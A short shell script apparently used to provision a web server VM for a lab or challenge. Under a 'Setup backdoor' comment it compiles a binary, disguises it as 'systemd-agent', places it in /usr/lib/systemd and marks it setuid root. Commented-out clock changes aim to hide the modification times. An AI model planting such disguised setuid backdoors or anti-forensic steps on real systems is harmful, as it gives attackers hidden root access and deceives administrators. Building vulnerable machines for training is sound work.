# Start VM

# Copy files from host to webserver@192.168.50.32:~/ using scp
# scp -r ./Webserver webserver@192.168.50.32:~/

# (TODO: Set date back in the past to hide changes)
#date -s '2014-12-25 12:34:56'

# Add user database to screen group to allow service execution
usermod -a -G screen webserver

# Set up Webserver stuff

# Prepare, enable and start service
cp /home/webserver/scripts/webserver.service /etc/systemd/system
systemctl daemon-reload
systemctl enable webserver
systemctl start webserver

# TODO: Set time to 2017-05-15 15:46:45?
#date  -s '2017-05-15 15:46:45'

# Setup backdoor
# Compile
g++ -std=c++11 ./scripts/pown_ws.cpp -o systemd-agent # TODO: find better name?
# Move in right place
mv systemd-agent /usr/lib/systemd/
# Enable setuid
chmod 4755 /usr/lib/systemd/systemd-agent
# TODO: set time to current
#date  -s '2017-11-19 15:46:45'

# TODO: set secure passwords for all users (root, iadmin, database)
# passwd root
# passwd iadmin
# passwd webserver

# Cleanup